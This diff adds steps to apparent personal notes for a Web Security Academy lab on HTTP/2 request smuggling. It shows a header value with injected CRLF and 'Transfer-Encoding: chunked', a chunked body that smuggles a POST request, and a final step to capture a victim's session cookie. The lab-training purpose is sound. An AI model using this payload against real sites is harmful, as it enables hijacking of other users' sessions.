@@ -4422,7 +4422,25 @@ Response: Communication timed out. (chunked size is 5)
     search=phone
     ```
   - settings: allow HTTP/2 ALPN override
-  - ddd
+  - add request header
+    ```
+    name: foo
+    value: 
+    bar\r\n
+    Transfer-Encoding: chunked
+    ```
+  - requestor body
+    ```
+    0
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE
+    Content-Length: 800
+
+    search=x
+    ```
+  - refresh page > if you see a 404 response > refresh > victim request > grab the session cookie
 - dd
 - dd
 - dd
